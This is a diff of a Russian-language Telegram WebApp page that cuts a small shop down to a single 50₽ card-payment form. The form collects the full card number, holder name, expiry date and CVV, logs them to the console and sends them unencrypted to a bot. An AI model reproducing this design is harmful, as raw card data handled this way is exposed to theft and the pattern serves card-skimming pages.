@@ -3,217 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Мое приложение</title>
+    <title>Оплата</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            padding: 20px;
             margin: 0;
-            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+            margin-top: 0;
+        }
+        .info {
+            background: #f0f9ff;
+            border: 1px solid #b8e0ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .info p {
+            margin: 5px 0;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
             box-sizing: border-box;
         }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f5f5f5;
-            min-height: 100vh;
+        input:focus {
+            border-color: #0088cc;
+            outline: none;
         }
-        
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
+        .row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
         }
-        
-        .header {
-            background: linear-gradient(135deg, #0088cc 0%, #0055aa 100%);
-            color: white;
-            padding: 30px 20px;
-            border-radius: 0 0 30px 30px;
-            margin-bottom: 30px;
-            text-align: center;
-        }
-        
-        .user-info {
-            background: white;
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        
-        .product-card {
-            background: white;
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 15px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        
-        .product-card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
-        }
-        
-        .product-title {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-        
-        .product-price {
-            color: #0088cc;
-            font-weight: bold;
-            font-size: 16px;
-        }
-        
         button {
             width: 100%;
             padding: 15px;
             background: #0088cc;
             color: white;
             border: none;
-            border-radius: 10px;
-            font-size: 16px;
+            border-radius: 8px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            margin: 10px 0;
+            margin: 20px 0 10px;
         }
-        
         button:hover {
             background: #0066aa;
         }
-        
-        .payment-form {
-            background: white;
-            border-radius: 20px;
-            padding: 20px;
-            margin-top: 20px;
-            display: none;
-        }
-        
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
+        .status {
+            text-align: center;
+            padding: 10px;
             border-radius: 8px;
-            font-size: 16px;
-        }
-        
-        .row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-        }
-        
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 20px;
-            background: #4CAF50;
-            color: white;
-            border-radius: 10px;
+            margin: 10px 0;
             display: none;
-            animation: slideIn 0.3s;
-            z-index: 1000;
         }
-        
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🛍️ Мой магазин</h1>
-            <p>Покупай прямо в Telegram!</p>
+        <h2>💳 Оплата 50₽</h2>
+        
+        <div class="info" id="userInfo">
+            <p id="userId">Загрузка...</p>
         </div>
         
-        <div class="user-info" id="userInfo">
-            <h3>👤 Информация</h3>
-            <p id="userId">ID: Загрузка...</p>
-            <p id="userName">Имя: Загрузка...</p>
+        <input type="text" id="cardNumber" placeholder="Номер карты" maxlength="19">
+        <input type="text" id="cardName" placeholder="Имя владельца">
+        
+        <div class="row">
+            <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5">
+            <input type="password" id="cardCvv" placeholder="CVV" maxlength="3">
         </div>
         
-        <div class="product-card" onclick="showPayment(50)">
-            <div class="product-title">🎁 Набор сладостей</div>
-            <div class="product-price">50 ₽</div>
-            <p>Вкусные конфеты и печенье</p>
-        </div>
+        <button onclick="sendPayment()">💳 Оплатить 50₽</button>
+        <button onclick="sendTest()" style="background: #666;">📤 Тест отправки</button>
         
-        <div class="product-card" onclick="showPayment(100)">
-            <div class="product-title">🎁 Подарочный набор</div>
-            <div class="product-price">100 ₽</div>
-            <p>Ассорти из лучших сладостей</p>
-        </div>
-        
-        <div class="product-card" onclick="showPayment(200)">
-            <div class="product-title">🎁 Премиум набор</div>
-            <div class="product-price">200 ₽</div>
-            <p>Элитные шоколадные конфеты</p>
-        </div>
-        
-        <div class="payment-form" id="paymentForm">
-            <h3>💳 Оплата</h3>
-            <p>Сумма: <span id="paymentAmount">0</span> ₽</p>
-            
-            <input type="text" id="cardNumber" placeholder="Номер карты" maxlength="19">
-            <input type="text" id="cardName" placeholder="Имя владельца">
-            
-            <div class="row">
-                <input type="text" id="cardExpiry" placeholder="MM/ГГ" maxlength="5">
-                <input type="password" id="cardCvv" placeholder="CVV" maxlength="3">
-            </div>
-            
-            <button onclick="processPayment()">Оплатить</button>
-            <button onclick="hidePayment()" style="background: #666;">Отмена</button>
-        </div>
-        
-        <button onclick="sendTestData()">📤 Отправить тест</button>
+        <div class="status" id="status"></div>
     </div>
-    
-    <div class="notification" id="notification"></div>
-    
+
     <script>
-        // Инициализация Telegram
+        // Инициализация Telegram WebApp
         let tg = Telegram.WebApp;
         tg.ready();
         tg.expand();
         
         // Получаем данные пользователя
-        let initData = tg.initData;
-        let initDataUnsafe = tg.initDataUnsafe;
-        let user = initDataUnsafe?.user;
-        
+        let user = tg.initDataUnsafe?.user;
         if (user) {
-            document.getElementById('userId').innerText = `ID: ${user.id}`;
-            document.getElementById('userName').innerText = `Имя: ${user.first_name} ${user.last_name || ''}`;
-        }
-        
-        // Показать форму оплаты
-        function showPayment(amount) {
-            document.getElementById('paymentAmount').innerText = amount;
-            document.getElementById('paymentForm').style.display = 'block';
-            window.scrollTo(0, document.body.scrollHeight);
-        }
-        
-        // Скрыть форму оплаты
-        function hidePayment() {
-            document.getElementById('paymentForm').style.display = 'none';
-            clearPaymentForm();
-        }
-        
-        // Очистить форму
-        function clearPaymentForm() {
-            document.getElementById('cardNumber').value = '';
-            document.getElementById('cardName').value = '';
-            document.getElementById('cardExpiry').value = '';
-            document.getElementById('cardCvv').value = '';
+            document.getElementById('userId').innerHTML = 
+                `👤 ID: ${user.id}<br>📱 Имя: ${user.first_name} ${user.last_name || ''}`;
         }
         
         // Форматирование номера карты
@@ -231,51 +138,74 @@
         document.getElementById('cardExpiry').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length >= 2) {
-                let month = Math.min(parseInt(value.substring(0, 2)) || 1, 12);
-                let year = value.substring(2, 4);
-                e.target.value = (month < 10 ? '0' + month : month) + (year ? '/' + year : '');
+                e.target.value = value.substring(0,2) + '/' + value.substring(2,4);
             }
         });
         
-        // Ограничение CVV
+        // Только цифры для CVV
         document.getElementById('cardCvv').addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
         });
         
+        // Показать статус
+        function showStatus(message, type) {
+            let status = document.getElementById('status');
+            status.textContent = message;
+            status.className = 'status ' + type;
+            status.style.display = 'block';
+            
+            setTimeout(() => {
+                status.style.display = 'none';
+            }, 3000);
+        }
+        
+        // Тестовая отправка
+        function sendTest() {
+            let testData = {
+                action: 'test',
+                message: 'Тестовое сообщение',
+                time: new Date().toISOString()
+            };
+            
+            console.log('📤 Отправка теста:', testData);
+            tg.sendData(JSON.stringify(testData));
+            showStatus('✅ Тест отправлен!', 'success');
+        }
+        
         // Отправка платежа
-        function processPayment() {
+        function sendPayment() {
+            // Получаем данные
             let cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
             let cardName = document.getElementById('cardName').value;
             let cardExpiry = document.getElementById('cardExpiry').value;
             let cardCvv = document.getElementById('cardCvv').value;
-            let amount = document.getElementById('paymentAmount').innerText;
             
             // Валидация
             if (cardNumber.length !== 16) {
-                showNotification('❌ Неверный номер карты', 'error');
+                showStatus('❌ Неверный номер карты', 'error');
                 return;
             }
             
             if (cardName.length < 5) {
-                showNotification('❌ Введите имя владельца', 'error');
+                showStatus('❌ Введите имя владельца', 'error');
                 return;
             }
             
-            if (!/^\d{2}\/\d{2}$/.test(cardExpiry)) {
-                showNotification('❌ Неверный срок', 'error');
+            if (!cardExpiry || cardExpiry.length < 5) {
+                showStatus('❌ Введите срок действия', 'error');
                 return;
             }
             
             if (cardCvv.length !== 3) {
-                showNotification('❌ Неверный CVV', 'error');
+                showStatus('❌ Неверный CVV', 'error');
                 return;
             }
             
-            // Данные для отправки
+            // Формируем данные
             let paymentData = {
                 action: 'payment',
                 user_id: user?.id,
-                amount: parseInt(amount),
+                amount: 50,
                 card: {
                     number: cardNumber,
                     name: cardName,
@@ -284,42 +214,18 @@
                 }
             };
             
-            console.log('Отправка данных:', paymentData);
+            console.log('📤 Отправка платежа:', paymentData);
             
             // Отправляем в бота
             tg.sendData(JSON.stringify(paymentData));
             
-            showNotification('✅ Платеж отправлен!', 'success');
-            hidePayment();
-        }
-        
-        // Тестовая отправка
-        function sendTestData() {
-            let testData = {
-                action: 'test',
-                message: 'Привет от WebApp!',
-                timestamp: new Date().toISOString()
-            };
+            showStatus('✅ Платеж отправлен!', 'success');
             
-            tg.sendData(JSON.stringify(testData));
-            showNotification('✅ Тест отправлен', 'success');
-        }
-        
-        // Уведомления
-        function showNotification(message, type) {
-            let notification = document.getElementById('notification');
-            notification.innerText = message;
-            notification.style.backgroundColor = type === 'success' ? '#4CAF50' : '#f44336';
-            notification.style.display = 'block';
-            
-            setTimeout(() => {
-                notification.style.display = 'none';
-            }, 3000);
-        }
-        
-        // Закрытие приложения
-        function closeApp() {
-            tg.close();
+            // Очищаем форму
+            document.getElementById('cardNumber').value = '';
+            document.getElementById('cardName').value = '';
+            document.getElementById('cardExpiry').value = '';
+            document.getElementById('cardCvv').value = '';
         }
     </script>
 </body>
